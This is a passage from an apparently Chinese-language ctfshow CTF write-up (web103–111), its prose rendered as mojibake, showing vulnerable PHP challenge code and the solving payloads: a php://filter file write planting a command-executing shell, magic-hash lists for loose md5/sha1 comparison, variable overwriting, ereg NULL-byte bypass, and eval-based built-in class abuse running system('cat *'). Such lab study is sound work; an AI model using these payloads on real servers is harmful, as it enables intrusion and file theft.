åè½¬æˆ16è¿›åˆ¶å…¨æ˜¯æ•°å­—çš„å­—ç¬¦ä¸²</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token variable">$a</span><span class="token operator">=</span><span class="token string single-quoted-string">'&lt;?=`cat *`;'</span><span class="token punctuation">;</span> <span class="token variable">$b</span><span class="token operator">=</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//$a=PD89YGNhdCAqYDs=</span> <span class="token variable">$c</span><span class="token operator">=</span><span class="token function">bin2hex</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'PD89YGNhdCAqYDs'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">echo</span> <span class="token variable">$c</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span> å¾—åˆ°5044383959474e6864434171594473</code></pre><p><strong>PHPçŸ­æ ‡ç­¾</strong></p><?=(è¡¨è¾¾å¼)?><p>ç­‰ä»·äº<?php echo (è¡¨è¾¾å¼)?></p><p>Payload:</p><blockquote><p>GET:?v2&#x3D;115044383959474e6864434171594473&amp;v3&#x3D;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.base64-decode&#x2F;resource&#x3D;1.php</p><p>POST:v1&#x3D;hex2bin</p></blockquote><h4 id="web103"><a href="#web103" class="headerlink" title="web103"></a>web103</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$v4</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">,</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$str</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/.*p.*h.*p.*/i"</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$v3</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Sorry'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>åŠ äº†ä¸ªé¸¡è‚‹çš„é™åˆ¶ï¼Œå› ä¸ºæœ¬æ¥å°±æ˜¯ç”¨base64åŠ å¯†åçš„ï¼Œæ‰€ä»¥æ²¡ä»€ä¹ˆå½±å“</p><h4 id="web104-md5-sha1"><a href="#web104-md5-sha1" class="headerlink" title="web104(md5 sha1)"></a>web104(md5 sha1)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v2</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>shalå‡½æ•°å°±æ˜¯è®¡ç®—æ•£åˆ—å‡½æ•°ï¼Œå¯ä»¥ç†è§£ä¸ºä¸€ä¸ªä¸å¯é€†çš„åŠ å¯†å‡½æ•°ï¼Œè¿™é¢˜æ²¡å•¥è¿‡æ»¤ï¼Œç›´æ¥ä¼ ä¸¤ä¸ªç›¸åŒçš„å‚æ•°å°±å¥½äº†ï¼Œæ„é€ payload</p><p>æˆ–è€…ä½¿ç”¨æ•°ç»„ä¹Ÿå¯ä»¥ç»•è¿‡</p><p>å€¼çš„åˆ¤æ–­æ˜¯ä½¿ç”¨ <code>==</code>ï¼Œæ‰€ä»¥æ‰¾åŠ å¯†å 0e å¼€å¤´çš„ä¸¤ä¸ªå€¼ä¹Ÿå¯ä»¥ã€‚</p><blockquote><p>aaK1STfY -&gt; 0e76658526655756207688271159624026011393</p><p>aaO8zKZF -&gt; 0e89257456677279068558073954252716165668</p></blockquote><p>ä»¥ä¸‹è¿™äº›å­—ç¬¦ä¸²ï¼Œmd5å“ˆå¸Œä¹‹åéƒ½æ˜¯0eå¼€å¤´çš„ï¼š</p><blockquote><p>s878926199a -&gt; 0e545993274517709034328855841020</p><p>s155964671a -&gt; 0e342768416822451524974117254469</p><p>s214587387a -&gt; 0e848240448830537924465865611904 </p><p>s214587387a -&gt; 0e848240448830537924465865611904 </p><p>QLTHNDT -&gt; 0e405967825401955372549139051580 </p><p>QNKCDZO -&gt; 0e830400451993494058024219903391 </p><p>EEIZDOI -&gt; 0e782601363539291779881938479162 </p><p>240610708 -&gt; 0e462097431906509019562988736854 </p><p>4011627063 -&gt; 0e485805687034439905938362701775 </p><p>4775635065 -&gt; 0e998212089946640967599450361168 </p><p>4790555361 -&gt; 0e643442214660994430134492464512 </p><p>5432453531 -&gt; 0e512318699085881630861890526097 </p><p>5579679820 -&gt; 0e877622011730221803461740184915 </p><p>5585393579 -&gt; 0e664357355382305805992765337023 </p><p>6376552501 -&gt; 0e165886706997482187870215578015 </p><p>7124129977 -&gt; 0e500007361044747804682122060876 </p><p>7197546197 -&gt; 0e915188576072469101457315675502 </p><p>7656486157 -&gt; 0e451569119711843337267091732412</p></blockquote><h4 id="web105-phpå˜é‡è¦†ç›–"><a href="#web105-phpå˜é‡è¦†ç›–" class="headerlink" title="web105(phpå˜é‡è¦†ç›–)"></a>web105(phpå˜é‡è¦†ç›–)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$error</span><span class="token operator">=</span><span class="token string single-quoted-string">'ä½ è¿˜æƒ³è¦flagå˜›ï¼Ÿ'</span><span class="token punctuation">;</span><span class="token variable">$suces</span><span class="token operator">=</span><span class="token string single-quoted-string">'æ—¢ç„¶ä½ æƒ³è¦é‚£ç»™ä½ å§ï¼'</span><span class="token punctuation">;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_GET</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=></span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token operator">===</span><span class="token string single-quoted-string">'error'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"what are you doing?!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$$key</span><span class="token operator">=</span><span class="token variable">$$value</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_POST</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=></span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token operator">===</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"what are you doing?!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$$key</span><span class="token operator">=</span><span class="token variable">$$value</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token variable">$error</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"your are good"</span><span class="token operator">.</span><span class="token variable">$flag</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token variable">$suces</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><ul><li><p>æœ¬é¢˜è€ƒæŸ¥å˜é‡è¦†ç›–å’Œ<code>die()</code>çš„çŸ¥è¯†</p></li><li><p><code>$$a = $$b</code>å¯ä»¥ç±»ä¼¼äºï¼Œå°†$açš„åœ°å€æŒ‡å‘$b</p><p>æ‰€ä»¥æ— è®º$bæ€ä¹ˆæ”¹å˜å€¼ï¼Œ$açš„å€¼éƒ½ä¼šå’Œ$bä¸€æ ·</p></li><li><p><code>die()</code>å‡½æ•°è™½ç„¶ä¼šç»ˆæ­¢ç¨‹åºï¼Œä½†åŒæ—¶ä¹Ÿä¼šè¾“å‡ºæ‹¬å·å†…çš„ç»ˆæ­¢æç¤ºä¿¡æ¯</p></li><li><p>æœ¬é¢˜åˆ©ç”¨å˜é‡è¦†ç›–å’Œ<code>die()</code>å‡½æ•°çš„ç‰¹æ€§</p><ol><li>å…ˆå¯¹getçš„å†…å®¹è¿›è¡Œè¦†ç›–ï¼Œä¸”ä¸èƒ½è¦†ç›–errorï¼Œæ‰€ä»¥è¦è¦†ç›–sucesï¼Œå³?suces&#x3D;flagï¼Œæ­¤æ—¶suces&#x3D;&gt;flagçš„åœ°å€</li><li>å†å¯¹postçš„å†…å®¹è¿›è¡Œè¦†ç›–ï¼Œä¸”ä¸èƒ½å°†flagç›´æ¥è¦†ç›–ï¼Œæ‰€ä»¥åªèƒ½error&#x3D;sucesï¼Œæ­¤æ—¶error&#x3D;&gt;flagçš„åœ°å€</li><li>æ­¤æ—¶æ— è®ºè¿›å…¥å“ªä¸ª<code>die()</code>å‡½æ•°ï¼Œéƒ½å¯ä»¥è¾“å‡º<code>$flag</code>çš„å€¼</li></ol></li></ul><p>Payload:</p><blockquote><p>GET:?suces&#x3D;flag</p><p>POST:error&#x3D;suces</p></blockquote><h4 id="web106"><a href="#web106" class="headerlink" title="web106"></a>web106</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$v1</span><span class="token operator">!=</span><span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> </code></pre><p>åŠ äº†é™åˆ¶ï¼ŒPayloadåŒ104</p><h4 id="web107-parse-str"><a href="#web107-parse-str" class="headerlink" title="web107(parse_str)"></a>web107(parse_str)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v3</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>       <span class="token function">parse_str</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">,</span><span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$v3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>           <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>       <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> </code></pre><p><strong>parse_str</strong>($v1,$v2); &#x2F;&#x2F;æŠŠv1çš„å€¼ç›¸åº”çš„æ¢æˆé”®å€¼å¯¹å†å­˜å…¥v2(æ•°ç»„)<br>v1&#x3D;flag&#x3D;114&amp;index&#x3D;300çš„è¯ï¼Œ<br>v2å°±å˜æˆä¸€ä¸ªæ•°ç»„ï¼Œå†…å®¹ä¸ºflagâ€“&gt;114      indexâ€“&gt;300ï¼ˆåˆ†ä¸ºè¿™ä¸¤ä¸ªé”®å€¼å¯¹ï¼‰</p><p>æ‰€ä»¥åªéœ€è¦è®©ä¼ å…¥çš„flag md5å€¼ä¸v3ä¸€æ ·å°±å¯</p><p>Payload:</p><blockquote><p>POST:v1&#x3D;flag&#x3D;47bce5c74f589f4867dbd57e9ca9f808</p><p>GET:?v3&#x3D;aaa</p></blockquote><h4 id="we108-ereg-NULLæˆªæ–­æ¼æ´"><a href="#we108-ereg-NULLæˆªæ–­æ¼æ´" class="headerlink" title="we108(ereg NULLæˆªæ–­æ¼æ´)"></a>we108(ereg NULLæˆªæ–­æ¼æ´)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">ereg</span> <span class="token punctuation">(</span><span class="token string double-quoted-string">"^[a-zA-Z]+$"</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token constant boolean">FALSE</span><span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'error'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//åªæœ‰36dçš„äººæ‰èƒ½çœ‹åˆ°flag</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token function">strrev</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">0x36d</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> </code></pre><p>ereg (â€œ^[a-zA-Z]+$â€, $_GET[â€˜câ€™])&#x3D;&#x3D;&#x3D;FALSE</p><p>ereg()å‡½æ•°ç”¨æŒ‡å®šçš„æ¨¡å¼æœç´¢ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­æŒ‡å®šçš„å­—ç¬¦ä¸²,å¦‚æœåŒ¹é…æˆåŠŸè¿”å›true,å¦åˆ™,åˆ™è¿”å›falseã€‚æœç´¢å­— æ¯çš„å­—ç¬¦æ˜¯å¤§å°å†™æ•æ„Ÿçš„ã€‚</p><p>ç»“åˆereg()å‡½æ•°ç”¨æ³•ï¼Œæœç´¢ä¸åˆ°æŒ‡å®šå­—ç¬¦ä¸²å°±ä¼šè¿”å›FALSE</p><p>æ‰€ä»¥è¦è®©cä¸­æœ‰å­—æ¯ï¼Œä½†ä¸èƒ½å‡ºç°å…¶ä»–ä¸œè¥¿</p><p>ereg å‡½æ•°å­˜åœ¨ NULL æˆªæ–­æ¼æ´ï¼Œå¯ä»¥ç»•è¿‡æ­£åˆ™è¿‡æ»¤ï¼Œä½¿ç”¨ %00 æˆªæ–­ã€‚</p><p>0x36dï¼Œè½¬åè¿›åˆ¶æ˜¯877ã€‚</p><p>Payload:<code>c=a%00778</code></p><h4 id="web109-phpå†…ç½®ç±»çš„ä½¿ç”¨"><a href="#web109-phpå†…ç½®ç±»çš„ä½¿ç”¨" class="headerlink" title="web109(phpå†…ç½®ç±»çš„ä½¿ç”¨)"></a>web109(phpå†…ç½®ç±»çš„ä½¿ç”¨)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v2</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[a-zA-Z]+/'</span><span class="token punctuation">,</span> <span class="token variable">$v1</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[a-zA-Z]+/'</span><span class="token punctuation">,</span> <span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"echo new <span class="token interpolation"><span class="token variable">$v1</span></span>(<span class="token interpolation"><span class="token variable">$v2</span></span>());"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span> </code></pre><p>çœ‹åˆ°echo newå°è¯•åå°„ç±»</p><p>Payloadï¼š</p><blockquote><p>?v1&#x3D;Reflectionclass&amp;v2&#x3D;system(â€˜tac fl36dg.txtâ€™)</p><p>?v1&#x3D;Exception&amp;v2&#x3D;system(â€˜cat *â€™)  å¼‚å¸¸å¤„ç†</p><p>?v1&#x3D;class{ public function __construct(){ system(â€˜lsâ€™); } };&amp;v2&#x3D;a  ç”¨åŒ¿åç±»ç»•è¿‡ </p></blockquote><p>v1&#x3D;å†…ç½®ç±»&amp;v2&#x3D;system(â€˜lsâ€™)å³å¯ phpä¸­ä¼šå…ˆæ‰§è¡Œlså‘½ä»¤ç„¶åæŠŠç»“æœä½œä¸ºå‚æ•°å†æ‰§è¡Œä½†lsçš„ç»“æœå·²ç»è¢«è¾“å‡ºäº†</p><h4 id="web110-FilesystemIterator-class"><a href="#web110-FilesystemIterator-class" class="headerlink" title="web110(FilesystemIterator class)"></a>web110(FilesystemIterator class)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v2</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]/'</span><span class="token punctuation">,</span> <span class="token variable">$v1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"error v1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]/'</span><span class="token punctuation">,</span> <span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"error v2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"echo new <span class="token interpolation"><span class="token variable">$v1</span></span>(<span class="token interpolation"><span class="token variable">$v2</span></span>());"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </code></pre><p>[The FilesystemIterator class](<a href="https://www.php.net/manual/zh/class.filesystemiterator.php">PHP: FilesystemIterator - Manual</a>)</p><p>phpå†…ç½®ç±» åˆ©ç”¨ FilesystemIterator è·å–æŒ‡å®šç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶</p><p>Payload:<code>?v1=FilesystemIterator&amp;v2=getcwd</code></p><h4 id="web111-GLOBALS"><a href="#web111-GLOBALS" class="headerlink" title="web111(GLOBALS)"></a>web111(GLOBALS)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">getFlag</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$v1</span><span class="token punctuation">,</span><span class="token operator">&amp;</span><span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$$v1</span></span> = &amp;<span class="token interpolation"><span class="token variable">$$v2</span></span>;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$$v1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v2</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\>/'</span><span class="token punctuation">,</span> <span class="token variable">$v1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"error v1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\>/'</span><span class="token punctuation">,</span> <span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"error v2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/ctfshow/'</span><span class="token punctuation">,</span> <span class="token variable">$v1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token function">getFlag</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">,</span><span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> </span></code></pre><p>æ³¨æ„ PHP çš„å‡½æ•°å…·æœ‰è¯æ³•ä½œç”¨åŸŸ</p><p>åœ¨å‡½æ•°å†…éƒ¨æ— æ³•è°ƒç”¨å¤–éƒ¨çš„å˜é‡ï¼Œé™¤éè¿›è¡Œä¼ å‚ã€‚è¿™é“é¢˜æ— éæ³¨æ„ä»¥ä¸‹å‡ ç‚¹ï¼š</p><ol><li>æˆ‘ä»¬æœ€ç»ˆè¦å¾—åˆ° $flag çš„å€¼ï¼Œå°±éœ€è¦ var_dump($$v1) ä¸­çš„ $v1 ä¸º flagï¼Œå³ $v2 è¦ä¸º flagï¼Œè¿™æ · $$v2 å°±ä¸º $flagï¼Œ&amp;$$v2 å°±ä¸º $flag å¯¹åº”çš„å€¼</li><li>URL ä¼ å‚æ—¶ $v2 ä¸èƒ½ç›´æ¥ä¼ ä¸º flagï¼Œå¦åˆ™ $flag ä¼šå› â€œå‡½æ•°å†…éƒ¨æ— æ³•è°ƒç”¨å¤–éƒ¨å˜é‡â€çš„é™åˆ¶è€Œå¯¼è‡´å…¶è¿”å› 